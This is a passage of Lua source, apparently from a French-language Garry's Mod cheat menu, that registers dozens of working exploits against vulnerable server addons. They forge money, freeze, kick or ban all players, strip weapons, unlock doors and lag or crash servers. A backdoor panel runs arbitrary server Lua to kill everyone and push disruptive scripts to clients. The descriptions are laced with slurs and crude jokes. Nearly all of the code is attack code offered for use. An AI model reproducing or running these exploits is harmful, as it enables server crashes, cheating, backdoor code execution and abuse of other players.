net.WriteString('You have to select a player before doing a action.')       
net.SendToServer()
iZNX.ChatText("Tentative de kick sur ".. v:Nick().. "!")
end
end, },
},
} )
iZNX.AddExploit( "NLR Freeze", {
desc = "Exploit pour freeze des joueurs",
severity = 3,
scan = function() return iZNX.ValidNetString( "NLR.ActionPlayer" ) end,
functions = {
{ typ = "players", addr = "l_players_listing45" },
{ typ = "func", name = "Freeze", func = function()
local t = iZNX.GetStored( "l_players_listing45", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart("NLR.ActionPlayer")
net.WriteEntity(v)
net.SendToServer()
end  
end, },
},
} )
iZNX.AddExploit( "Supprimer les props 1", {
desc = "Supprimer touts les props du serveur x)",
severity = 2,
scan = function() return iZNX.ValidNetString( "timebombDefuse" ) end,
functions = {
{ typ = "func", name = "Supprimer", func = function()
for k,v in pairs(ents.GetAll()) do
iZNX.NetStart("timebombDefuse")
net.WriteEntity(v)
net.WriteBool(true)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "Hack Keypads", {
desc = "Tu peux mettre Anonymous en photo de profil maintenant.",
severity = 1,
scan = function() return iZNX.ValidNetString( "start_wd_emp" ) end,
functions = {
{ typ = "func", name = "Hacker", func = function()
iZNX.NetStart("start_wd_emp")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ Kart System €", {
desc = "Exploit d'argent.",
severity = 3,
scan = function() return iZNX.ValidNetString( "kart_sell" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
for i=1, 300 do
iZNX.NetStart("kart_sell")
net.WriteString("sw_gokart")
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "€ Farming Mod €", {
desc = "Exploit d'argent, go payer des putes et de la coke ;)",
severity = 3,
scan = function() return iZNX.ValidNetString( "FarmingmodSellItems" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent1" },
{ typ = "func", name = "Prendre", func = function()
iZNX.NetStart( "FarmingmodSellItems" )
net.WriteTable(
{
Cost    =   10,
CropModel    =   "models/props/eryk/garlic.mdl",
CropType =   2,
Info  =   "Garlic Seed",
Model =   "models/props/eryk/seedbag.mdl",
Name    =   "Garlic",
Quality    =   4,
Sell  =   iZNX.GetStored( "montant_argent1" ),
Type  =   "Seed"
}
)
net.WriteInt(1,16)
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ Point Shop €", {
desc = "Exploit d'argent, go payer des putes et de la coke ;)",
severity = 3,
scan = function() return iZNX.ValidNetString( "ClickerAddToPoints" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent2" },
{ typ = "func", name = "Prendre", func = function()
iZNX.NetStart("ClickerAddToPoints")
net.WriteInt(iZNX.GetStored( "montant_argent2" ), 32)
net.SendToServer()
end, },
},
} )
local PM = 1
local SK = 1
local BG = 1
local HN = 1
local TS = 1
local GL = 1
local LG = 1
iZNX.AddExploit( "Body Groups", {
desc = "Changer de skin",
severity = 1,
scan = function() return iZNX.ValidNetString( "bodyman_model_change" ) end,
functions = {
{ typ = "func", name = "Changer", func = function()
PlayerModels = {0,1,2,3,4,5,6}
Torso = {0,1,2,3,4,5,6,7,8,9,10}
Legs = {0,1,2,3,4,5,6}
Hands = {0,1,2}
Glasses = {0,1}
Skins = {0,1,2,3,4,5,6,7,8,9,10}
PM = PM+1
TS = TS+1
LG = LG+1   
HN = HN+1
GL = GL+1
SK = SK+1
if (PM>#PlayerModels) then PM=1 end
if (SK>#Skins) then SK=1 end
if (HN>#Hands) then HN=1 end
if (TS>#Torso) then TS=1 end
if (GL>#Glasses) then GL=1 end
if (LG>#Legs) then LG=1 end
iZNX.NetStart("bodyman_model_change")
net.WriteInt(PlayerModels[PM], 10 )
net.SendToServer()
iZNX.NetStart("bodygroups_change")
net.WriteTable( { 1, Torso[TS] } )
net.SendToServer()
iZNX.NetStart("bodygroups_change")
net.WriteTable( { 2, Legs[LG] } )
net.SendToServer()
iZNX.NetStart("bodygroups_change")
net.WriteTable( { 3, Hands[HN] } )
net.SendToServer()
iZNX.NetStart("bodygroups_change")
net.WriteTable( { 4, Glasses[GL] } )
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ Hitman X €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return iZNX.ValidNetString( "SendMoney" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent666" },
{ typ = "players", addr = "l_players_list" },
{ typ = "func", name = "Donner", func = function()
local t = iZNX.GetStored( "l_players_list", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
iZNX.NetStart( "SendMoney" )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteString( -iZNX.GetStored( "montant_argent666" ) )
net.SendToServer()
end
end, },
{ typ = "func", name = "Enlever", func = function()
hook.Remove( "HUDPaint", "skhdsakjl")
local t = iZNX.GetStored( "l_players_list", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart( "SendMoney" )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteString( iZNX.GetStored( "montant_argent666" ) )
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "€ Bail Out €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return iZNX.ValidNetString( "BailOut" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent16" },
{ typ = "players", addr = "l_player_liste" },
{ typ = "func", name = "Donner", func = function()
local t = iZNX.GetStored( "l_player_liste", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart( "BailOut" )
net.WriteEntity( LocalPlayer() )
net.WriteEntity( v )
net.WriteFloat( -iZNX.GetStored( "montant_argent16" )  )
net.SendToServer()
end
end, },
{ typ = "func", name = "Enlever", func = function()
local t = iZNX.GetStored( "l_player_liste", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart( "BailOut" )
net.WriteEntity( LocalPlayer() )
net.WriteEntity( v )
net.WriteFloat( iZNX.GetStored( "montant_argent16" )  )
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "€ Tow Truck €", {
desc = "Spawn vehicule dépanneur / Exploit d'argent Regarder le vehicule qui possède une amande",
severity = 2,
scan = function() return iZNX.ValidNetString( "TOW_SubmitWarning" ) end,
functions = {
{ typ = "func", name = "Spawn Dépanneuse", func = function()
iZNX.NetStart("TowTruck_CreateTowTruck")
net.SendToServer()
end, },
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent17" },
{ typ = "func", name = "Argent Exploit", func = function()
for k,v in pairs(ents.GetAll()) do 
iZNX.NetStart("TOW_SubmitWarning")
net.WriteString(LocalPlayer():SteamID())
net.WriteDouble(-iZNX.GetStored( "montant_argent17" ))
net.WriteEntity(v)
net.SendToServer()
iZNX.NetStart("TOW_PayTheFine")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "Fire Truck", {
desc = "Spawn camion de pompier",
severity = 1,
scan = function() return iZNX.ValidNetString( "FIRE_CreateFireTruck" ) end,
functions = {
{ typ = "func", name = "Spawn", func = function()
iZNX.NetStart("FIRE_CreateFireTruck")
net.SendToServer()    
end, },
},
} )
iZNX.AddExploit( "€ Hit Menu €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return iZNX.ValidNetString( "hitcomplete" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent18" },
{ typ = "func", name = "Prendre", func = function()
iZNX.NetStart("hitcomplete")
net.WriteDouble(iZNX.GetStored( "montant_argent18" ))               
net.SendToServer()      
end, },
},
} )
iZNX.AddExploit( "€ HHH €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return iZNX.ValidNetString( "hhh_request" ) end,
functions = {
{ typ = "func", name = "Prendre", func = function()
local plyhhh = LocalPlayer()              
for k,v in pairs(player.GetAll()) do                
dahater = v   
end        
if dahater != plyhhh then       
local hitRequest = {}
hitRequest.hitman = plyhhh
hitRequest.requester = plyhhh
hitRequest.target = dahater
hitRequest.reward = -9999999
iZNX.NetStart( 'hhh_request' )
net.WriteTable( hitRequest )
net.SendToServer()
else
iZNX.ChatText( "Cette version de HHH n'est pas exploitable !" )    
end
end, },
},
} )
iZNX.AddExploit( "€ DaHit €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return iZNX.ValidNetString( "DaHit" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent20" },
{ typ = "players", addr = "l_players_listdahit" },
{ typ = "func", name = "Donner", func = function()
local t = iZNX.GetStored( "l_players_listdahit", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
iZNX.NetStart( "DaHit" )               
net.WriteFloat( -iZNX.GetStored( "montant_argent20" )  )                            
net.WriteEntity( v )               
net.WriteEntity( v )               
net.WriteEntity( v )               
net.SendToServer()  
end  
end, },
{ typ = "func", name = "Enlever", func = function()
local t = iZNX.GetStored( "l_players_listdahit", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
iZNX.NetStart( "DaHit" )               
net.WriteFloat( iZNX.GetStored( "montant_argent20" )  )                            
net.WriteEntity( v )               
net.WriteEntity( v )               
net.WriteEntity( v )               
net.SendToServer()    
end
end, },
{ typ = "func", name = "Spam Prendre", func = function()
if !timer.Exists( "Lokidev_exploit_spamdahitprendre" ) then
iZNX.ChatText( "Spam lancé" )
timer.Create( "Lokidev_exploit_spamdahitprendre", 1, 0, function()
local t = iZNX.GetStored( "l_players_listdahit", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
iZNX.NetStart( "DaHit" )               
net.WriteFloat( -iZNX.GetStored( "montant_argent20" )  )                            
net.WriteEntity( v )               
net.WriteEntity( v )               
net.WriteEntity( v )               
net.SendToServer()    
end
end)
else
timer.Remove( "Lokidev_exploit_spamdahitprendre" )
iZNX.ChatText( "Spam stoppé" )
end
end, },
{ typ = "func", name = "Spam Enlever", func = function()
if !timer.Exists( "Lokidev_exploit_spamdahitenlever" ) then
iZNX.ChatText( "Spam lancé" )
timer.Create( "Lokidev_exploit_spamdahitenlever", 1, 0, function()
local t = iZNX.GetStored( "l_players_listdahit", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
iZNX.NetStart( "DaHit" )               
net.WriteFloat( iZNX.GetStored( "montant_argent20" )  )                            
net.WriteEntity( v )               
net.WriteEntity( v )               
net.WriteEntity( v )               
net.SendToServer()    
end
end)
else
timer.Remove( "Lokidev_exploit_spamdahitenlever" )
iZNX.ChatText( "Spam stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "Anti-Printer", {
desc = "Appliquez des dommages constants aux Printers à proximité",
severity = 1,
scan = function() return iZNX.ValidNetString( "customprinter_get" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
if !timer.Exists( "Lokidev_exploit_printersmasher" ) then
iZNX.ChatText( "Anti-Printer lancé" )
timer.Create( "Lokidev_exploit_printersmasher", 0, 0, function()
for k, v in pairs( ents.GetAll() ) do
if ( v:GetClass():find("print") && v:GetPos():Distance( LocalPlayer():GetPos() ) <= 750 ) then
iZNX.NetStart("customprinter_get")
net.WriteEntity(v)
net.WriteString("onoff")
net.SendToServer()
end
end
end)
else
timer.Remove( "Lokidev_exploit_printersmasher" )
iZNX.ChatText( "Anti-Printer stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "Crash le Serveur", {
desc = "Comme sont nom l'indique niquez moi ce serveur de la",
severity = 3,
scan = function() return iZNX.ValidNetString( "textstickers_entdata" ) end,
functions = {
{ typ = "func", name = "Crash", func = function()
iZNX.NetStart( "textstickers_entdata" )
net.WriteUInt( 0xFFFFFFF, 32 )
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Munition Gratuit", {
desc = "Vous donne des munition pour toutes vos armes",
severity = 1,
scan = function() return iZNX.ValidNetString( "TCBBuyAmmo" ) end,
functions = {
{ typ = "func", name = "Prendre", func = function()
for k,v in pairs(GAMEMODE.AmmoTypes) do
iZNX.NetStart("TCBBuyAmmo")
net.WriteTable( {nil,v.ammoType,nil,"0","999999"} )
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "€ Advanced Money Printer €", {
desc = "Voler tout l'argent des printers",
severity = 3,
scan = function() return iZNX.ValidNetString( "DataSend" ) end,
functions = {
{ typ = "func", name = "Prendre", func = function()
for k, v in pairs( ents.GetAll() ) do
if v:GetClass() == "adv_moneyprinter" then    
iZNX.NetStart("DataSend")
net.WriteFloat(2)
net.WriteEntity(v)
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end
end, },
},
} )
iZNX.AddExploit( "gBan Ban tout le monde", {
desc = "Exploit pout bannir tout le monde sauf toi ^^, exploit trouvé dans une ancienne version de gBan",
severity = 3,
scan = function() return iZNX.ValidNetString( "gBan.BanBuffer" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
for k,v in pairs(player.GetAll()) do               
if v != LocalPlayer() then       
iZNX.NetStart( "gBan.BanBuffer" )
net.WriteBool( true )
net.WriteInt( 0, 32 )
net.WriteString( "Des poutous partout" )
net.WriteString( v:SteamID() )
net.SendToServer()
end
end
end, },
},
} )
iZNX.AddExploit( "Lag Exploit #1", {
desc = "L'admin devrait avoir honte de faire payer un VIP.",
severity = 2,
scan = function() return iZNX.ValidNetString( "ATS_WARP_REMOVE_CLIENT" ) end,
functions = {
{ typ = "func", name = "Big Lag", func = function()
if !timer.Exists( "Lokidev_exploit_lagsploit1" ) then
iZNX.ChatText( "Lag lancé" )
timer.Create( "Lokidev_exploit_lagsploit1", 0.02, 0, function()
for k,v in pairs(player.GetAll()) do
iZNX.NetStart( "ATS_WARP_REMOVE_CLIENT" )
net.WriteEntity( v )
net.WriteString( "adminroom1" )
net.SendToServer()
iZNX.NetStart( "ATS_WARP_FROM_CLIENT" )
net.WriteEntity( v )
net.WriteString( "adminroom1" )
net.SendToServer()
iZNX.NetStart( "ATS_WARP_VIEWOWNER" )
net.WriteEntity( v )
net.WriteString( "adminroom1" )
net.SendToServer()
end
end)
else
timer.Remove( "Lokidev_exploit_lagsploit1" )
iZNX.ChatText( "Lag stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "Console Spam", {
desc = "Il suffit de spammer dans la console",
severity = 1,
scan = function() return ULib end,
functions = {
{ typ = "func", name = "Big Spam", func = function()
if !timer.Exists( "Lokidev_exploit_bigspames2" ) then
iZNX.ChatText( "Lag lancé" )
timer.Create( "Lokidev_exploit_bigspames2", 0, 0, function()
for i = 1, 200 do
LocalPlayer():ConCommand( "_u Seized by NineTailedFox xD " )
end
end)
else
timer.Remove( "Lokidev_exploit_bigspames2" )
iZNX.ChatText( "Lag stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "Lag Exploit #2", {
desc = "Clique pour mettre en position croque mcdo le fonda!",
severity = 1,
scan = function() return iZNX.ValidNetString( "Keypad" ) end,
functions = {
{ typ = "func", name = "Big Lag", func = function()
if !timer.Exists( "Lokidev_exploit_lagsploit4" ) then
iZNX.ChatText( "Lag lancé" )
timer.Create( "Lokidev_exploit_lagsploit4", 0, 0, function()
for i = 1, 1000 do
iZNX.NetStart("Keypad")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end)
else
timer.Remove( "Lokidev_exploit_lagsploit4" )
iZNX.ChatText( "Lag stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "Lag Exploit #3", {
desc = "Faire lag le serveur comme s'il était hébergé en Afrique",
severity = 2,
scan = function() return iZNX.ValidNetString( "CreateCase" ) end,
functions = {
{ typ = "func", name = "Big Lag", func = function()
if !timer.Exists( "Lokidev_exploit_lagsploit5" ) then
iZNX.ChatText( "Lag lancé" )
timer.Create( "Lokidev_exploit_lagsploit5", 0.02, 0, function()
for i = 1, 300 do
iZNX.NetStart( "CreateCase" )
net.WriteString( "Bitch please" )
net.SendToServer()
end
end)
else
timer.Remove( "Lokidev_exploit_lagsploit5" )
iZNX.ChatText( "Lag stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "Lag Exploit #4", {
desc = "Il doit y en avoir des merdes dans ce serveur !",
severity = 2,
scan = function() return iZNX.ValidNetString( "rprotect_terminal_settings" ) end,
functions = {
{ typ = "func", name = "Big Lag", func = function()
if !timer.Exists( "Lokidev_exploit_lagsploit6" ) then
iZNX.ChatText( "Lag lancé" )
timer.Create( "Lokidev_exploit_lagsploit6", 0.02, 0, function()
for i = 1, 200 do
iZNX.NetStart( "rprotect_terminal_settings" )
net.WriteEntity( LocalPlayer() )
net.SendToServer()
end
end)
else
timer.Remove( "Lokidev_exploit_lagsploit6" )
iZNX.ChatText( "Lag stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "Lag Exploit #5", {
desc = "Faire crash un serveur sans props ? Mkprod en sueur!",
severity = 2,
scan = function() return iZNX.ValidNetString( "StackGhost" ) end,
functions = {
{ typ = "func", name = "Big Lags", func = function()
if !timer.Exists( "Lokidev_exploit_lagsploit7" ) then
iZNX.ChatText( "Lag lancé" )
timer.Create( "Lokidev_exploit_lagsploit7", 0.015, 0, function()
for i = 1, 8 do
for k,v in pairs( player.GetAll() ) do
iZNX.NetStart( "StackGhost" )
net.WriteInt(69,32)
net.SendToServer()
end
end
end)
else
timer.Remove( "Lokidev_exploit_lagsploit7" )
iZNX.ChatText( "Lag stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "Réanimation Exploit", {
desc = "Vous etes automatiquement réanimé après avoir été tué",
severity = 2,
scan = function() return iZNX.ValidNetString( "RevivePlayer" ) end,
functions = {
{ typ = "func", name = "Immortel :)", func = function()
if !timer.Exists( "Lokidev_exploit_zombie" ) then
iZNX.ChatText( "Tu es Immortel" )
timer.Create( "Processdev_exploit_zombie", 0.5, 0, function()
if !LocalPlayer():Alive() then
iZNX.NetStart("RevivePlayer")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end)
else
timer.Remove( "Processdev_exploit_zombie" )
iZNX.ChatText( "Tu es redevenu Mortel!" )
end
end, },
},
} )
iZNX.AddExploit( "Armory Robbery", {
desc = "Prenez les armes de la police à l'armurerie (Vous devez etre proche d'elle), a un temps de recharge de 5 minutes",
severity = 2,
scan = function() return iZNX.ValidNetString( "ARMORY_RetrieveWeapon" ) end,
functions = {
{ typ = "func", name = "Prendre Arme 1", func = function()
iZNX.NetStart("ARMORY_RetrieveWeapon")
net.WriteString("weapon1")
net.SendToServer()
end, },
{ typ = "func", name = "Prendre Arme 2", func = function()
iZNX.NetStart("ARMORY_RetrieveWeapon")
net.WriteString("weapon2")
net.SendToServer()
end, },
{ typ = "func", name = "Prendre Arme 3", func = function()
iZNX.NetStart("ARMORY_RetrieveWeapon")
net.WriteString("weapon3")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Admin Stick / Porte exploit", {
desc = "Déverrouiller / Verrouiller Porte / Enlever le proprio (vous devez regarder une porte)",
severity = 3,
scan = function() return iZNX.ValidNetString( "fp_as_doorHandler" ) end,
functions = {
{ typ = "func", name = "Déverrouiller", func = function()
iZNX.NetStart("fp_as_doorHandler")
net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
net.WriteString("unlock")
net.SendToServer()
end, },
{ typ = "func", name = "Verrouiller", func = function()
iZNX.NetStart("fp_as_doorHandler")
net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
net.WriteString("lock")
net.SendToServer()
end, },
{ typ = "func", name = "Enlever le Proprio", func = function()
local door = LocalPlayer():GetEyeTrace().Entity
local doorOwner = door:getDoorData()["owner"]
iZNX.NetStart("fp_as_doorHandler")
net.WriteEntity(door)
net.WriteString("removeOwner")
net.WriteDouble(doorOwner)
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Processdev Report Spammer", {
desc = "Envoyer des Report sur tout le monde",
severity = 1,
scan = function() return iZNX.ValidNetString( "TransferReport" ) end,
functions = {
{ typ = "func", name = "Report Tout le Monde", func = function()
for k, v in pairs( player.GetAll() ) do
iZNX.NetStart( "TransferReport" )
net.WriteString( v:SteamID() )
net.WriteString( "SERVEUR CODER PAR LE Q" )
net.WriteString( "Bitch please" )
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "SAC Crash", {
desc = "Fait instantanément Crash n'importe quel serveur exécutant la simplicité anticheat",
severity = 3,
scan = function() return iZNX.ValidNetString( "SimplicityAC_aysent" ) end,
functions = {
{ typ = "func", name = "Crash", func = function()
local tbl = {}
for i=1,400 do
tbl[i] = i
end
iZNX.NetStart("SimplicityAC_aysent")
net.WriteUInt(1, 8)
net.WriteUInt(4294967295, 32)
net.WriteTable(tbl)
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Crash Serveur", {
desc = "Cliquez sur ce bouton pour Crash le serveur instantanément.",
severity = 3,
scan = function() return iZNX.ValidNetString( "pac_to_contraption" ) end,
functions = {
{ typ = "func", name = "Crash", func = function()
local tbl = {}
for i=1,1000000000 do
tbl[#tbl + 1] = i
end
iZNX.NetStart("pac_to_contraption")
net.WriteTable( tbl )
net.SendToServer()
end, },
},
} )
local function nukeweapon( ent )
if !ent:IsValid() then return end
if ent.LNextNuke and ent.LNextNuke > CurTime() then return end
iZNX.NetStart("properties")
net.WriteString("remove")
net.WriteEntity( ent )
net.SendToServer()
ent.LNextNuke = CurTime() + 0.5
end
local function nukeallweapons( tab )
for k, v in pairs( tab ) do
if !v:IsValid() then continue end
if v.LNextNuke and v.LNextNuke > CurTime() then continue end
iZNX.NetStart("properties")
net.WriteString("remove")
net.WriteEntity( v )
net.SendToServer()
end
end
iZNX.AddExploit( "Strip les armes", {
desc = "Enlever les armes de n'importe quel fils de pute.",
severity = 3,
scan = function() return iZNX.ValidNetString( "properties" ) and (!FPP or (FPP and FPP.Settings.FPP_TOOLGUN1.worldprops == 1)) end,
functions = {
{ typ = "string", name = "Type d'Arme à Strip", default = "*", addr = "stripper_gunz" },
{ typ = "players", addr = "stripper_plyz" },
{ typ = "func", name = "Strip", func = function()
if !timer.Exists( "stripclub" ) then
iZNX.ChatText( "Strip lancé" )
timer.Create( "stripclub", 0.5, 0, function()
local t = iZNX.GetStored( "stripper_plyz", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local gunz = v:GetWeapons()
local findstring = iZNX.GetStored( "stripper_gunz", "*" )
if findstring == "*" then nukeallweapons( gunz ) return end
local findstringtab = string.Explode( ", ", findstring )
for _, g in pairs( gunz ) do
for _, s in pairs( findstringtab ) do
if string.find( string.lower( g:GetClass() ), s ) then
nukeweapon( g )
end
end
end
end
end)
else
timer.Remove( "stripclub" )
iZNX.ChatText( "Strip stoppé" )
end
end, },
},
} )
function iZNX.MakeFunctionButton( parent, x, y, btext, func, tooltip)
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y )
TButton:SetText( btext )
TButton:SetTextColor( Color(255, 255, 255, 255) )
TButton:SizeToContents()
TButton:SetTall( 24 )
if tooltip then TButton:SetToolTip( tooltip ) end
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(255, 0, 0, 225) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 60, 60, 60 ) )
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
TButton.DoClick = function()
func()
end
return TButton:GetWide(), TButton:GetTall()
end
function iZNX.HTXBackdoor( parent, x, y, btext )
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y )
TButton:SetText( btext )
TButton:SetTextColor( Color(255, 0, 0, 255) )
TButton:SizeToContents()
TButton:SetTall( 24 )
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(100, 60, 60, 200) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 60, 60, 60 ) )
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.SetDrawColor( Color(110, 70, 70, 255) )
surface.DrawOutlinedRect( 2, 2, w - 4, h - 4 )
end
TButton.DoClick = function()
iZNX.HTXCommandeListe()
end
return TButton:GetWide(), TButton:GetTall()
end
function iZNX.HTXCommandeListe()
if iZNX.HTXCommandeSelector and iZNX.HTXCommandeSelector:IsVisible() then iZNX.HTXCommandeSelector:Remove() end
iZNX.HTXCommandeSelector = vgui.Create("DFrame")
iZNX.HTXCommandeSelector:SetSize(240,350)
iZNX.HTXCommandeSelector:SetTitle("Commandes")
iZNX.HTXCommandeSelector:SetPos( gui.MouseX(), gui.MouseY() )
iZNX.HTXCommandeSelector:MakePopup()
iZNX.HTXCommandeSelector.Paint = function( s, w, h )
if !iZNX.Menu or !iZNX.Menu:IsVisible() then s:Remove() return end
surface.SetDrawColor( Color(255, 0, 0 ,255) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(55, 55, 55, 245) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
end
local DScrollPanel = vgui.Create( "DScrollPanel", iZNX.HTXCommandeSelector )
DScrollPanel:Dock( FILL )
local commandnethtx1 = vgui.Create("DButton", DScrollPanel)
commandnethtx1:SetSize( 208, 20 )
commandnethtx1:SetPos( 2, 175 )
commandnethtx1:SetText("Tuer tous les joueurs")
commandnethtx1:SetTextColor(Color(255, 255, 255, 255))
commandnethtx1.Paint = function(panel, w, h)
surface.SetDrawColor(0, 26, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx1.DoClick = function()
iZNX.NetStart(thefrenchenculer)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Kill() end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx2 = vgui.Create("DButton", DScrollPanel)
commandnethtx2:SetSize( 208, 20 )
commandnethtx2:SetPos( 2, 100 )
commandnethtx2:SetText("Super-Spam Visuel/Sonore 2")
commandnethtx2:SetTextColor(Color(255, 255, 255, 255))
commandnethtx2.Paint = function(panel, w, h)
surface.SetDrawColor(0, 26, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx2.DoClick = function()
iZNX.NetStart(thefrenchenculer)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SendLua([[local hud = vgui.Create(\"HTML\") hud:MoveToFront() hud:SetSize(200,158) hud:SetPos(0,0) hud:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531246-swag-dance.gif\")]]) v:SendLua([[local hud2 = vgui.Create(\"HTML\") hud2:MoveToFront() hud2:SetSize(200,158) hud2:SetPos(0,ScrH()-158) hud2:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531305-spin.gif\")]]) v:SendLua([[local hud3 = vgui.Create(\"HTML\") hud3:MoveToFront() hud3:SetSize(200,158) hud3:SetPos(ScrW()-200,0) hud3:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531246-swag-dance.gif\")]]) v:SendLua([[local hud4 = vgui.Create(\"HTML\") hud4:MoveToFront() hud4:SetSize(200,158) hud4:SetPos(ScrW()-200,ScrH()-158) hud4:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531305-spin.gif\")]]) timer.Create( \"spamsondeouf\", 1, 0, function() v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end) v:SendLua([[hook.Add(\"HUDPaint\",\"c\", function() draw.RoundedBox(0,0,0,ScrW(),ScrH(),Color(math.random(1,255),math.random(1,255),math.random(1,255),155)) end)]]) end BroadcastLua([[hook.Add( \"RenderScreenspaceEffects\", \"ohgod\", function() local sinScaler = math.sin( CurTime() *(RealFrameTime() *1024) ) DrawSharpen( 1 +(sinScaler *10), 0.5 +(sinScaler *2) ) DrawMaterialOverlay( \"effects/tp_eyefx/tpeye\", 1 ) end)]]) BroadcastLua([[timer.Create( \"thedrop\", 0.42, 0, function() util.ScreenShake( LocalPlayer():GetPos(), 512, 5, 0.25, 128 ) end )]]) BroadcastLua([[local hud3 = vgui.Create(\"HTML\") hud3:SetSize(400,300) hud3:SetPos(ScrW()/2-200,ScrH()/2-150) hud3:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531253-skel2.gif\")]])" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx3 = vgui.Create("DButton", DScrollPanel )
commandnethtx3:SetSize( 208, 20 )
commandnethtx3:SetPos( 2, 375 )
commandnethtx3:SetText("Débannir tout les bannis")
commandnethtx3:SetTextColor(Color(255, 255, 255, 255))
commandnethtx3.Paint = function(panel, w, h)
surface.SetDrawColor(0, 26, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx3.DoClick = function()
